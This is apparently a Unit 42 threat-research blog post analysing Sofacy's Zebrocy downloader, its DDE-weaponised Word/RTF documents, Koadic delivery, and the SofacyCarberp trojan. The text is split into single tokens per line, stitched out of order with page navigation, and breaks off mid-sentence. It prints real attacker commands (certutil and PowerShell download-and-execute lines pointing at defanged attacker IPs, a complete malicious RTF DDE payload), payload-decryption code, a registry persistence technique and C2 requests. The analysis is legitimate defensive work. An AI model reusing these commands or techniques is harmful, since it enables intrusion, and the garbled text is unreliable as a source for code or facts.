decompression
routine
.

The
payload
is
in
the
loader
at
file
offset
:
0x19880
–
0x1F23C
size
of
0x59BD
.

The
payload
can
be
decrypted
and
decompressed
with
the
following
Python
script
:
123456789
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
The
loader
will
drop
the
following
files
in
the
%
LOCALAPPDATA
%
file
path
:
import
ctypes
nt
=
ctypes.windll.ntdll
def
decompress_buffer
(
data
)
:
final_size
=
ctypes.c_ulong(0
)
uncompressed
=ctypes.c_buffer(0x7c00
)
nt.RtlDecompressBuffer(0x102,uncompressed,0x7C00,ctypes.c_char_p(data),0x59BD,ctypes.byref(fi
return
uncompressed.raw
def
main
(
)
:
Startkey='3950BE2CD37B2C7CCBF8'.decode('hex
'
)
with
open('C:\\temp\\carvedDLL.dat','rb
'
)
as
fp
:
Payload=fp.read
(
)
decrpted=
[
]
Count=0
for
i
in
Payload
:
InnerCount=0
key=ord
(
i
)
for
x
in
range
(
0
,
len
(
Startkey
)
)
:
result
=
(
ord
(
Startkey
[
x
]
)
+
Count
*
InnerCount
)
&
0xFF
InnerCount+=1
key
^=
result
Count+=1
decrpted.append(key
)
decompressed=decompress_buffer
(
str
(
bytearray
(
decrpted
)
)
)
with
open
(
'
C:\\temp\\CarvedDLL_decrypted.dat','wb
'
)
as
wp
:
wp.write(bytearray(decompressed
)
)
print
'
Finished
'
if
__name__
==
'__main__
'
:
main
(
)
Cdnver.dll
Cdnver.bat
To
evade
observable
detection
from
Windows
explorer
,
file
attributes
are
set
to
hidden
.

%
LOCALAPPDATA
%
would
be
the
user
's
path
from
the
user
who
launched
the
executable
,
i.e.
,
C
:
\Users\user\AppData\Local
where
the
user
would
contain
the
user
's
logon
account
.

To
execute
the
dropped
DLL
,
the
loader
first
checks
the
integrity
level
of
the
executing
process
,
and
if
it
does
not
have
the
necessary
permissions
,
the
loader
will
enumerate
the
system
's
processes
searching
for
explorer.exe
.

This
process
was
most
likely
chosen
as
it
typically
runs
with
administrator
privileges
.

The
loader
will
attempt
to
use
the
permission
of
explorer.exe
to
execute
the
dropped
DLL
via
CreateProcessAsUser
.

If
the
user
who
executed
the
loader
is
admin
or
has
sufficient
privileges
this
step
is
skipped
.

The
execution
is
handled
using
the
Windows
rundll32.exe
program
and
calls
the
DLL
's
export
via
ordinal
number
1
.

Example
:
start
rundll32.exe
'C
:
\Users\user\AppData\Local\cdnver.dll',#1
For
persistence
,
the
loader
will
add
the
following
registry
key
UserInitMprLogonScript
to
HKCU
\Environment
with
the
following
value
:
C
:
\Users\user\AppData\Local\cdnver.bat
This
entry
would
cause
the
batch
file
to
be
executed
any
time
the
user
logs
on
.

The
batch
file
contains
the
following
information
:
start
rundll32.exe
'C
:
\Users\user\AppData\Local\cdnver.dll',#1
The
use
of
the
UserInitMprLogonScript
is
not
new
to
Sofacy
,
as
Mitre
's
ATT
&
CK
framework
(
https://attack.mitre.org/wiki/Technique/T1037 B_url.normal
)
shows
Sofacy
's
use
of
this
registry
key
as
an
example
of
the
Logon
Scripts
(
https://attack.mitre.org/wiki/Technique/T1037 B_url.normal
)
persistence
technique
.

SofacyCarberp
Payload
The
DLL
delivered
in
these
attacks
is
a
variant
of
the
SofacyCarberp
payload
,
which
is
used
extensively
by
the
Sofacy
threat
group
.

API
Resolution
Previous
versions
of
this
Trojan
used
code
taken
from
the
leaked
Carberp
source
code
,
which
mainly
involved
Carberp
's
code
used
to
resolve
API
functions
.

However
,
this
version
of
SofacyCarberp
uses
a
hashing
algorithm
to
locate
the
correct
loaded
DLL
based
on
its
BaseDLLName
in
order
to
manually
load
API
functions
.

It
does
so
by
loading
the
PEB
,
then
accesses
the
_PEB_LDR_DATA
structure
and
then
obtains
the
unicode
string
for
BaseDllName
in
the
InLoadOrderModuleList
.

It
treats
this
unicode
string
as
an
ASCII
string
by
skipping
every
other
byte
then
gets
the
lowercase
version
of
the
string
.

It
then
subjects
the
resulting
string
of
lowercase
characters
to
a
hashing
algorithm
and
checks
the
resulting
hash
to
a
hardcoded
value
.

The
following
Python
script
shows
the
algorithm
used
to
determine
the
hashed
values
:
123456789
10
The
following
is
a
list
of
hardcoded
values
used
to
find
the
correct
loaded
DLL
:
l
=
[
'kernel32.dll','ntdll.dll
'
]
for
lib
in
l
:
seed
=
0
for
e
in
lib
:
c
=
ord
(
e
)
if
ord
(
e
)
-0x41
<
=
25
and
ord
(
e
)
-0x41
>
0
:
c
=
ord
(
e
)
+32
seed
=
(
c
+
0x19660D
*
seed
+
0x3C6EF35F
)
&
0xFFFFFFFF
print
'
%
s
is
0x
%
x
'
%
(
lib
,
seed
)
0x98853A78
–
kernel32.dll
0xA4137E37
–
ntdll.dll
It
specifically
looks
for
the
following
APIs
based
on
its
hash
:
0x77b826b3
–
?

(
most
likely
ntdll.ZwProtectVirtualMemory
based
on
code
context
)
0x2e33c8ac
–
ntdll.ZwWriteVirtualMemory
0xb9016a44
–
ntdll.ZwFreeVirtualMemory
0xa2ea8afa
–
ntdll.ZwQuerySystemInformation
0x99885504
–
ntdll.ZwClose
0x46264019
–
ntdll.ZwOpenProcess
0x3B66D24C
–
kernel32
.
?

0x79F5D836
–
kernel32
.
?

Injecting
into
Browsers
The
Trojan
will
use
the
same
hashing
algorithm
for
API
resolution
to
find
browser
processes
running
on
the
system
with
the
intention
of
injecting
code
into
the
browser
to
communicate
with
its
C2
server
.

The
use
of
this
hashing
algorithm
differs
from
previous
variants
of
SofacyCarberp
,
as
previously
reported
by
ESET
(
https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part1.pdf B_url.normal
)
.

To
begin
the
code
injection
,
the
Trojan
calls
the
ZwQuerySystemInformation
function
,
specifically
requesting
for
the
data
associated
with
SystemProcessInformation
.

The
result
is
a
structure
named
SYSTEM_PROCESS_INFORMATION
,
which
the
Trojan
will
access
the
Unicode
string
in
the
field
ImageName
(
offset
0x3c
)
.

The
Trojan
then
subjects
this
unicode
string
in
ASCII
format
to
the
hashing
algorithm
,
looking
for
the
following
:
0xCDCB4E50
–
iexplore.exe
0x70297938
–
firefox.exe
0x723F0158
–
chrome.exe
The
Trojan
will
attempt
to
inject
code
into
these
browsers
to
carry
out
its
C2
communications
.

To
carry
out
C2
communications
via
injected
code
in
a
remote
process
,
the
injected
code
reaches
out
to
the
C2
server
and
saves
the
response
to
a
memory
mapped
file
named
SNFIRNW
.

The
Trojan
uses
a
custom
communication
protocol
within
this
mapped
file
,
but
at
a
high
level
the
Trojan
will
continually
look
for
data
within
the
mapped
SNFIRNW
file
and
process
the
data
in
the
same
manner
as
if
it
communicated
with
the
C2
server
within
its
own
process
.

Command
and
Control
Communications
In
addition
to
being
able
to
communicate
with
its
C2
server
from
code
injected
into
a
web
browser
,
the
Trojan
can
also
carry
out
the
same
communication
process
within
its
own
process
.

The
C2
communication
uses
HTTPS
and
specifically
sets
the
following
flags
to
do
so
in
a
manner
to
allow
invalid
certificates
:
SECURITY_FLAG_IGNORE_CERT_DATE_INVALID|SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SEC
URITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION
The
initial
request
sent
from
the
Trojan
is
to
google.com
,
likely
as
an
internet
connectivity
check
.

Figure
7
Initial
request
from
SofacyCarberp
Trojan
to
Google
to
check
for
Internet
access
As
seen
in
the
activity
above
,
the
Trojan
issues
a
POST
request
to
a
URL
that
contains
randomly
sized
and
randomly
generated
strings
.

The
URL
also
contains
a
randomly
chosen
string
from
the
following
list
:
vnd.wmc
.3gpp2
.ktx
.rfc822
.vnd.flatland.3dml
.report
.vnd.radisys.msml-basic-layout
.3gpp
This
list
of
strings
differs
from
previously
analyzed
SofacyCarberp
samples
,
such
as
the
variant
discussed
in
our
June
2016
blog
'New
Sofacy
Attacks
Against
US
Government
Agency
(
https://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/ B_url.normal
)
'
that
chose
from
a
list
of
strings
.xml
,
.pdf
,
.htm
or
.zip
.

The
value
for
the
one
parameter
,
specifically
WrLqG1kMJXpgID1rODM=
is
base64
encoded
ciphertext
that
decrypts
to
the
string
UihklEpz4V
,
which
is
hardcoded
in
the
Trojan
.

The
algorithm
used
to
encrypt
the
data
in
the
URL
the
same
algorithm
as
used
in
previous
SofacyCarberp
samples
(
https://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/ B_url.normal
)
we
have
analyzed
(
https://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform B_url.normal
)
.

The
data
in
the
POST
request
is
the
base64
encoded
user-agent
seen
in
the
request
.

After
establishing
that
the
system
has
Internet
access
,
the
Trojan
will
gather
detailed
system
information
and
send
it
to
the
C2
server
.

The
gathered
information
includes
a
unique
identifier
based
on
the
storage
volume
serial
number
(
id
field
)
,
a
list
of
running
processes
,
network
interface
card
information
,
the
storage
device
name
(
disk
field
)
,
the
Trojan
's
build
identifier
(
build
field
,
specifically
0x9104f000
)
,
followed
by
a
screenshot
of
the
system
(
img
field
)
.

The
screenshot
functionality
in
this
Trojan
is
rather
interesting
,
as
instead
of
using
Windows
APIs
to
take
a
screenshot
,
the
Trojan
's
code
simulates
the
user
pressing
the
'Take
Screenshot
'
key
(
VK_SCREENSHOT
)
on
the
keyboard
which
saves
the
screenshot
to
the
clipboard
.

The
Trojan
then
accesses
the
data
in
the
clipboard
and
converts
it
to
a
JPG
image
to
include
in
this
HTTP
request
.

All
of
this
data
is
encrypted
,
base64
encoded
and
sent
to
the
C2
server
in
a
HTTP
POST
to
a
URL
that
a
similar
structure
as
the
initial
internet
connectivity
check
.

Figure
8
HTTP
POST
from
SofacyCarberp
to
C2
server
with
system
information
The
SofacyCarberp
Trojan
parses
the
C2
server
's
response
to
the
request
for
data
that
the
Trojan
will
then
use
to
download
a
secondary
payload
to
the
system
.

The
Trojan
looks
in
the
response
data
for
sections
between
the
tags
[
file
]
and
[
/file
]
and
[
settings
]
and
[
/settings
]
,
which
we
have
observed
in
other
SofacyCarberp
samples
we
have
analyzed
.

However
,
this
particular
variant
also
contains
another
section
with
the
tags
[
shell
]
and
[
/shell
]
.

The
Trojan
parses
these
sections
for
specific
fields
that
dictate
how
the
Trojan
will
operate
,
including
where
the
Trojan
will
save
the
downloaded
file
,
how
the
Trojan
runs
the
secondary
payload
and
what
C2
location
the
Trojan
should
communicate
with
.

The
following
fields
are
parsed
by
the
Trojan
:
FileName
:
Specified
filename
PathToSave
:
Path
to
specified
file
Execute
:
Create
a
process
with
the
specified
file
Delete
:
Delete
the
specified
file
LoadLib
:
Load
the
specified
DLL
into
the
current
process
ReadFile
:
Reads
a
specified
the
file
Rundll
:
Runs
the
specified
DLL
with
a
specified
exported
function
IP
:
Set
C2
location
shell
:
Run
additional
code
in
a
newly
created
thread
The
data
in
the
shell
section
specified
in
the
shell
field
is
base64
encoded
data
that
decodes
to
raw
assembly
.

We
surmise
this
fact
based
on
the
Trojan
using
the
base64
decoded
data
to
create
a
local
thread
,
which
suggests
that
the
provided
data
can
be
any
position
independent
code
or
shellcode
.

Got
something
to
say
?

Leave
a
comment...
Notify
me
of
followup
comments
via
e-mail
Name
(
required
)
Email
(
required
)
Website
SUBMIT
SUBSCRIBE
TO
NEWSLETTERS
Email
COMPANY
Company
(
https://www.paloaltonetworks.com/company B_url.normal
)
Careers
(
https://www.paloaltonetworks.com/company/careers B_url.normal
)
Sitemap
(
https://www.paloaltonetworks.com/sitemap B_url.normal
)
Report
a
Vulnerability
(
https://www.paloaltonetworks.com/security-disclosure B_url.normal
)
SUBSCRIBE
LEGAL
NOTICES
Privacy
Policy
(
https://www.paloaltonetworks.com/legal-notices/privacy B_url.normal
)
Terms
of
Use
(
https://www.paloaltonetworks.com/legal-notices/terms-of-use B_url.normal
)
ACCOUNT
Manage
Subscription
(
https://www.paloaltonetworks.com/company/subscriptions B_url.normal
)

(
https://www.linkedin.com/company/palo-alto-networks B_url.normal
)

(
https://www.facebook.com/PaloAltoNetworks/ B_url.normal
)

(
https://twitter.com/PaloAltoNtwks B_url.normal
)
(
https://ignite.paloaltonetworks.com/usa/ B_url.normal
?

CampaignId=7010g000001IH8U
&
utm_content=Ignite18USA
&
utm_medium=390x90banner
&
utm_source=website
)
©
2016
Palo
Alto
Networks
,
Inc
.

All
rights
reserved
.

SALES
>
866.320.4788

SEE
A
DEMO

TAKE
A
TEST
DRIVE
(
HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD B_url.normal
)
Products
Services
Resources
Partners
Company
Security
for...
Support
EN
Blog
Home
>
Unit
42
>
Sofacy
Group
's
Parallel
Attacks
Sofacy
Group
's
Parallel
Attacks
By
Bryan
Lee
and
Robert
Falcone
June
6
,
2018
at
5:00
AM
Category
:
Unit
42
Tags
:
AutoIT
,
Carberp
,
DealersChoice
,
Ministry
of
Foreign
Affairs
,
Sofacy
,
Zebrocy B_malware.drop

2,319

(
3
)



Summary

The
Sofacy
group
remains
a
persistent
global
threat
.

Unit
42
and
others
have
shown
in
the
first
half
of
2018
how
this
threat
actor
group
continues
to
target
multiple
organizations
throughout
the
world
with
a
strong
emphasis
on
government
,
diplomatic
and
other
strategic
organizations
primarily
in
North
America
and
Europe
.

Following
up
our
most
recent
Sofacy
research
in
February
and
March
of
2018
,
we
have
found
a
new
campaign
that
uses
a
lesser
known
tool
widely
attributed
to
the
Sofacy
group
called
Zebrocy B_malware.drop
.

Zebrocy B_malware.drop
is
delivered
primarily
via
phishing
attacks
that
contain
malicious
Microsoft
Office
documents
with
macros
as
well
as
simple
executable
file
attachments
.

This
third
campaign
is
consistent
with
two
previously
reported
attack
campaigns
in
terms
of
targeting
:
the
targets
were
government
organizations

Get
updates
:
Unit
42
Sign
up
to
receive
the
latest
news
,
cyber
threat
intelligence
and
research
from
Unit42
Business
Email
By
submitting
this
form
,
you
agree
to
our
Terms
of
Use
and
acknowledge
our
Privacy
Statement
.

reCAPTCHA
Please
upgrade
to
a
supported
browser
to
get
a
reCAPTCHA
challenge
.

Alternatively
if
you
think
you
are
getting
this
page
in
error
,
please
check
your
internet
connection
and
reload
.

Why
is
this
happening
to
me
?

SUBMIT
dealing
with
foreign
affairs
.

In
this
case
however
the
targets
were
in
different
geopolitical
regions
.

An
interesting
difference
we
found
in
this
newest
campaign
was
that
the
attacks
using
Zebrocy B_malware.drop
cast
a
far
wider
net
within
the
target
organization
:
the
attackers
sent
phishing
emails
to
a
an
exponentially
larger
number
of
individuals
.

The
targeted
individuals
did
not
follow
any
significant
pattern
,
and
the
email
addresses
were
found
easily
using
web
search
engines
.

This
is
a
stark
contrast
with
other
attacks
commonly
associated
with
the
Sofacy
group
where
generally
no
more
than
a
handful
of
victims
are
targeted
within
a
single
organization
in
a
focus-fire
style
of
attack
.

In
addition
to
the
large
number
of
Zebrocy B_malware.drop
attacks
we
discovered
,
we
also
observed
instances
of
the
Sofacy
group
leveraging
the
Dynamic
Data
Exchange
(
DDE
)
exploit
technique
previously
documented
by
McAfee
.

The
instances
we
observed
,
however
,
used
the
DDE
exploit
to
deliver
different
payloads
than
what
was
observed
previously
.

In
one
instance
the
DDE
attack
was
used
to
deliver
and
install
Zebrocy B_malware.drop
.

In
another
instance
,
the
DDE
attack
was
used
to
deliver
an
open-source
penetration
testing
toolkit
called
Koadic
.

The
Sofacy
group
has
leveraged
open
source
or
freely
available
tools
and
exploits
in
the
past
but
this
is
the
first
time
that
Unit
42
has
observed
them
leveraging
the
Koadic
toolkit
.

Links
to
previous
attacks
In
our
February
report
,
we
discovered
the
Sofacy
group
using
Microsoft
Office
documents
with
malicious
macros
to
deliver
the
SofacyCarberp
payload
to
multiple
government
entities
.

In
that
report
,
we
documented
our
observation
that
the
Sofacy
group
appeared
to
use
conventional
obfuscation
techniques
to
mask
their
infrastructure
attribution
by
using
random
registrant
and
service
provider
information
for
each
of
their
attacks
.

In
particular
,
we
noted
that
the
Sofacy
group
deployed
a
webpage
on
each
of
the
domains
.

This
is
odd
because
attackers
almost
never
set
up
an
actual
webpage
on
adversary
C2
infrastructure
.

Even
stranger
,
each
webpage
contained
the
same
content
within
the
body
.

Since
that
report
,
we
continued
our
research
into
this
oddity
.

Using
this
artifact
,
we
were
able
to
pivot
and
discover
another
attack
campaign
using
the
DealersChoice
exploit
kit
with
similar
victimology
to
what
we
saw
in
February
.

Continuing
to
use
this
artifact
,
we
discovered
another
domain
with
the
same
content
body
,
supservermgr[.]com
.

This
domain
was
registered
on
December
20
,
2017
and
within
a
few
days
was
resolving
to
92.222.136[.]105 B_ip.unknown
,
which
belonged
to
a
well-known
VPS
provider
often
used
by
the
Sofacy
group
.

Unfortunately
,
at
the
time
of
collection
,
the
C2
domain
had
been
sinkholed
by
a
third
party
.

Based
on
dynamic
and
static
analysis
of
the
malware
sample
associated
with
the
supservermgr[.]com B_url.distribute
domain
however
,
we
were
able
to
determine
several
unique
artifacts
which
allowed
us
to
expand
our
dataset
and
discover
additional
findings
.

First
,
we
determined
the
sample
we
collected
,
d697160ae...
was
attempting
to
communicate
to
its
C2
at
hxxp://supservermgr[.]com/sys/upd/pageupd.php B_url.distribute
to
retrieve
a
Zebrocy B_malware.drop
AutoIT
downloader
.

Because
the
domain
had
been
sinkholed
,
this
activity
could
not
be
completed
.

However
,
we
were
able
determine
a
unique
,
hard-coded
user
agent
used
for
the
C2
communications
:
Mozilla/4.0
(
compatible
;
MSIE
6.0
;
Windows
NT
5.1
;
SV1
;
.NET
CLR
1.1.4322
;
.NET
CLR
2.0.50727
;
.NET
CLR
3.0.04506.30
;
.NET
CLR
3.0.04506.648
;
InfoPath.1
)

Using
AutoFocus
,
we
pivoted
from
the
user
agent
string
to
expand
our
data
set
to
three
additional
Zebrocy B_malware.drop
samples
using
the
exact
same
user
agent
.

This
led
us
to
additional
infrastructure
for
Zebrocy B_malware.drop
at
185.25.51[.]198 B_ip.distribute
and
185.25.50[.]93 B_ip.distribute
.

At
this
point
we
had
collected
nearly
thirty
samples
of
Zebrocy B_malware.drop
in
relation
to
the
original
sample
and
its
associated
C2
domain
.

Additional
pivoting
based
on
artifacts
unique
to
this
malware
family
expanded
our
dataset
to
hundreds
of
samples
used
over
the
last
several
years
.

Most
of
the
additional
samples
were
the
Delphi
and
AutoIT
variants
as
reported
by
ESET
.

However
,
several
of
the
collected
samples
were
a
C++
variant
of
the
Zobracy
downloader
tool
.

In
addition
,
we
discovered
evidence
of
a
completely
different
payload
in
Koadic
being
delivered
as
well
.

Also
,
we
found
the
IP
address
185.25.50[.]93 B_ip.distribute
hosting
C2
services
for
a
Delphi
backdoor
that
ESET
's
report
states
is
the
final
stage
payload
for
these
attacks
.

A
Maltego
chart
diagramming
the
relational
analysis
we
performed
is
below
:

Figure
1
Visualization
of
relationships
Please
note
this
is
not
a
comprehensive
chart
of
all
Zebrocy B_malware.drop
and
Koadic
samples
we
were
able
to
collect
.

Only
samples
mentioned
or
relevant
to
the
relational
analysis
have
been
included
.

From
the
185.25.50[.]93 B_ip.distribute
C2
IP
,
we
discovered
another
hard-coded
user
agent
being
used
by
Zebrocy B_malware.drop
:
Mozilla/5.0
(
Windows
NT
6.1
;
WOW64
)
WinHttp/1.6.3.8
(
WinHTTP/5.1
)
like
Gecko
We
observed
several
samples
of
Zebrocy B_malware.drop
using
this
user
agent
targeting
the
foreign
affairs
ministry
of
a
large
Central
Asian
nation
.

Pivoting
off
of
this
artifact
provided
us
additional
Zebrocy B_malware.drop
samples
.

One
sample
in
particular
,
cba5ab65a...
used
yet
another
unique
user
agent
string
in
combination
with
the
previous
user
agent
for
its
C2
:
Mozilla
v5.1
(
Windows
NT
6.1
;
rv:6.0.1
)
Gecko
/
20100101
Firefox
/
6.0.1

A
malware
sample
using
two
separate
unique
user
agent
strings
is
uncommon
.

A
closer
examination
of
the
tool
revealed
the
second
user
agent
string
was
from
a
secondary
payload
that
was
retrieved
by
the
cba5ab65a...
sample
.

Pivoting
from
the
Mozilla
v5.1
user
agent
revealed
over
forty
additional
Zebrocy B_malware.drop
samples
,
with
several
again
targeting
the
same
Central
Asian
nation
.

Two
samples
specifically
,
25f0d1cbc...
and
115fd8c61...
provided
additional
artifacts
we
were
able
to
pivot
from
to
discover
weaponized
documents
to
deliver
Zebrocy B_malware.drop
as
well
as
a
Koadic
.

Examining
the
use
of
the
unique
user
agents
'
strings
over
time
shows
that
while
previously
only
the
Mozilla/5.0
user
agent
was
in
use
,
since
mid
2017
all
three
user
agent
strings
have
been
used
by
the
Zebrocy B_malware.drop
tool
for
its
C2
communications
.

Figure
2
Timeline
of
User
Agents
DDE
Documents
The
two
weaponized
documents
we
discovered
leveraging
DDE
were
of
particular
interest
due
to
victimology
and
a
change
in
tactics
.

While
examining
25f0d1cbc...
,
we
were
able
to
pivot
from
its
C2
220.158.216[.]127 B_ip.distribute
to
gather
additional
Zebrocy B_malware.drop
samples
as
well
as
a
weaponized
document
.

This
document
(
85da72c7d...
)
appears
to
have
been
targeting
a
North
American
government
organization
dealing
with
foreign
affairs
.

It
leveraged
DDE
to
retrieve
and
install
a
payload
onto
the
victim
host
.

A
decoy
document
is
deployed
in
this
attack
,
with
the
contents
purporting
be
a
publicly
available
document
from
the
United
Nations
regarding
the
Republic
of
Uzbekistan
.

Figure
3
Example
of
delivery
document

Figure
4
Lure
image
used

The
creator
of
the
weaponized
document
appended
their
DDE
instructions
to
the
end
of
the
document
after
all
of
the
decoy
contents
.

When
the
document
is
opened
in
Word
,
the
instructions
are
not
immediately
visible
,
as
Word
does
not
display
these
fields
contents
by
default
.

As
you
can
see
in
the
following
screenshot
,
simply
attempting
to
highlight
the
lines
in
which
the
DDE
instructions
reside
does
not
display
them
.

Figure
5
Hidden
DDE
commands

Enabling
the
'
Toggle
Field
Codes
'
feature
reveals
the
DDE
instructions
to
us
and
shows
that
the
author
had
set
instructions
to
size
1
font
and
with
a
white
coloring
.

The
use
of
a
white
font
coloring
to
hide
contents
within
a
weaponized
document
is
a
technique
we
had
previously
reported
being
used
by
the
Sofacy
group
in
a
malicious
macro
attack
.

The
DDE
instructions
attempt
to
run
the
following
the
following
command
on
the
victim
host
,
which
attempts
to
download
and
execute
a
payload
from
a
remote
server
:
12345C
:
\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\
System32\\rundll32.exe
C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL
C:\\Windows\\System32\\cmd.exe
/k
certutil
-urlcache
-split
-f
hxxp://220.158.216[.]127/MScertificate.exe B_url.distribute
& I
MScertificate.exe I
'

During
our
analysis
,
we
observed
this
DDE
downloading
and
executing
a
Zebrocy B_malware.drop
AutoIt
downloader
(
f27836430...
)
,
configured
to
attempt
to
download
an
additional
payload
from
220.158.216[.]127 B_ip.distribute
.

The
DDE
instructions
also
included
another
command
that
it
did
not
run
,
which
suggests
it
is
an
artifact
of
a
prior
version
of
this
delivery
document
.

The
following
shows
this
unused
command
,
which
exposed
an
additional
server
within
Sofacy
's
infrastructure
would
download
and
execute
an
encoded
PowerShell
script
from
92.114.92[.]102 B_ip.distribute
:
12345C
:
\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\
System32\\WindowsPowerShell\\v1.0\\powershell.exe
-NoP
-sta
-NonI
-W
hidden
$
e=
(
New-Object
System.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');po
wershell
-enc
$
e
#
The
unused
command
above
appears
to
be
related
to
previous
attacks
,
specifically
attacks
that
occurred
in
November
2017
as
discussed
by
McAfee
and
ESET
.

The
payload
delivered
in
these
November
2017
attacks
using
DDE
enabled
documents
was
SofacyCarberp
,
which
differs
from
the
Zebrocy B_malware.drop
downloader
delivered
in
the
February
2018
attacks
.

115fd8c61...
was
another
Zebrocy B_malware.drop
sample
we
were
able
to
pivot
from
by
gathering
additional
samples
connecting
to
its
C2
86.106.131[.]177 B_ip.distribute
.

The
additional
samples
targeted
the
same
large
Central
Asian
nation
state
as
previously
mentioned
but
more
interestingly
,
one
of
the
samples
was
a
weaponized
document
also
leveraging
DDE
and
containing
a
non-Zebrocy
payload
.

The
payload
turned
out
to
be
an
open
source
penetration
test
toolkit
called
Koadic
.

It
is
a
toolkit
similar
to
Metasploit
or
PowerShell
Empire
and
is
freely
available
to
anyone
on
Github
.

Figure
6
Example
of
delivery
document
The
RTF
document
(
8cf3bc2bf...
)
was
very
small
in
size
at
264
bytes
,
which
can
be
seen
in
its
entirety
here
:

123456
{
\rtf1
{
\field
{
\*\fldinst
DDEAUTO
'C
:
\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe
'
'/C
POWErsHELl.eXE
-ex
BypaSs
-NOP
-w
HIdDen
(
NEw-oBjeCT
SyStEm.NET.weBCLiENT).dowNloADFILe
(
'
hxxp://86.106.131[.]177/link/GRAPH.EXE B_url.distribute
'
,
'
%
apPDAtA%\graph.exe
'
)
;
saps
'
%
Appdata%\graph.exe
''
}
}
}
The
contents
above
use
the
DDE
functionality
in
Microsoft
Word
to
run
a
PowerShell
script
to
download
the
Koadic
payload
from
a
remote
server
,
save
it
as
an
executable
file
on
the
system
and
then
execute
the
payload
.

Conclusion
The
Sofacy
group
continues
their
targeted
attack
campaigns
in
2018
.

As
mentioned
in
this
blog
,
Sofacy
is
carrying
out
parallel
campaigns
to
attack
similar
targets
around
the
world
but
with
different
toolsets
.

The
Zebrocy B_malware.drop
tool
associated
with
this
current
strain
of
attacks
is
constructed
in
several
different
forms
based
on
the
programming
language
the
developer
chose
to
create
the
tool
.

We
have
observed
Delphi
,
AutoIt
,
and
C++
variants
of
Zebrocy B_malware.drop
,
all
of
which
are
related
not
only
in
their
functionality
,
but
also
at
times
by
chaining
the
variants
together
in
a
single
attack
.

These
attacks
are
still
largely
perpetrated
via
spear
phishing
campaigns
,
whether
via
simple
executable
attachments
in
hopes
that
a
victim
will
launch
the
file
to
using
a
previously
observed
DDE
exploitation
technique
.

Palo
Alto
Networks
customers
are
protected
from
Zebrocy B_malware.drop
and
Koadic
attacks
by
:
All
known
Zebrocy B_malware.drop
samples
have
a
malicious
verdict
in
WildFire
AutoFocus
customers
can
track
this
campaign
with
the
following
Tags
:
Zebrocy B_malware.drop
Koadic
Appendix
Zebrocy B_malware.drop
C++
Variant
On
February
19
,
2018
,
we
saw
a
spear
phishing
email
sent
to
a
foreign
affairs
organization
within
a
Central
Asian
country
,
which
attempted
to
delivered
an
attached
Zebrocy B_malware.drop
downloader
(
5b5e80f63...
)
written
in
the
Delphi
programming
language
.

This
downloader
obtained
a
second
downloader
,
which
in
this
case
was
very
similar
in
functionality
but
was
written
in
C++
instead
of
Delphi
.

This
variation
of
the
Zebrocy B_malware.drop
downloader
begins
by
gathering
the
serial
number
for
the
storage
volume
with
the
label
'C
:
\
'
and
the
computer
name
.

It
then
creates
an
invisible
window
(
0x0
pixel
)
in
the
bottom
right
corner
of
the
screen
,
which
will
call
the
main
function
of
the
Trojan
.

The
main
function
of
the
Trojan
interacts
with
its
configured
C2
server
to
obtain
additional
code
to
execute
.

The
main
function
gets
pertinent
strings
to
communicate
with
its
C2
by
calling
a
subfunction
with
a
specific
number
that
the
sub-function
uses
as
a
case
within
a
switch
statement
to
decrypt
the
desired
string
.

For
instance
,
here
are
the
resulting
decrypted
strings
from
each
of
the
case
statements
(
dd7e69e1...
)
:
Case
–
String
decrypted
1
–
85.25.50[.]93 B_ip.unknown
2
–
POST
http://185.25.50[.]93/syshelp/kd8812u/protocol.php B_url.normal
HTTP/1.1\r\nHost
:
185.25.50[.]93\r\nContent-Type
:
application/x-www-form-urlencoded\r\nContent-Length
:
3
–
porg=
4
–
Content-Length
:
The
Trojan
uses
raw
sockets
to
communicate
with
its
C2
server
and
uses
the
decrypted
string
above
to
create
HTTP
requests
.

It
starts
by
calling
this
specific
sub-function
with
an
argument
of
1
to
get
the
IP
address
for
the
C2
to
connect
.

It
then
calls
the
subfunction
with
the
argument
of
2
to
get
the
string
that
it
will
use
as
the
HTTP
POST
request
.

The
main
function
then
calls
the
subfunction
with
the
argument
3
to
get
the
POST
data
parameter
(
'
porg
'
)
along
with
the
volume
serial
number
and
computer
name
and
will
send
this
data
to
the
C2
via
the
HTTP
POST
request
.

The
resulting
HTTP
POST
request
looks
like
the
following
:
POST
http://185.25.50[.]93/syshelp/kd8812u/protocol.php B_url.normal
HTTP/1.1
Host
:
185.25.50[.]93 B_ip.unknown
Content-Type
:
application/x-www-form-urlencoded

Content-Length
:
21
porg=44908AE0524f422d
We
have
not
seen
a
C2
server
respond
to
our
requests
during
our
analysis
,
however
,
we
do
know
how
the
Trojan
will
parse
the
C2
's
response
for
specific
data
.

-1
–
Deletes
the
buffer
and
exits
the
Trojan
.

009
–
Deletes
the
buffers
and
exits
the
Trojan
.

If
neither
of
the
above
values
are
found
at
the
beginning
of
the
HTTP
response
,
the
Trojan
checks
the
C2
response
for
the
ASCII
representation
of
hexadecimal
bytes
.

The
Trojan
will
convert
these
hexadecimal
bytes
to
their
binary
values
and
write
them
to
a
file
and
will
run
the
file
using
the
'
open
'
function
using
the
ShellExecuteW
API
function
.

We
have
seen
the
following
HTTP
POST
parameters
within
the
Zebrocy B_malware.drop
C++
samples
:
porg
structOne
oq
volume
DDE
Details
The
author
of
the
DDE
document
used
in
the
February
2018
attacks
used
some
obfuscation
techniques
in
an
attempt
to
evade
detection
.

First
,
the
DDE
instructions
heavily
rely
on
the
QUOTE
field
,
which
converts
decimal
values
to
their
ASCII
equivalent
character
.

Also
,
the
author
capitalized
the
'E
'
in
the
'
dde
'
command
to
evade
case
sensitive
signatures
.

Lastly
,
the
author
bolded
the
'dd
'
characters
within
the
'dde
'
command
,
which
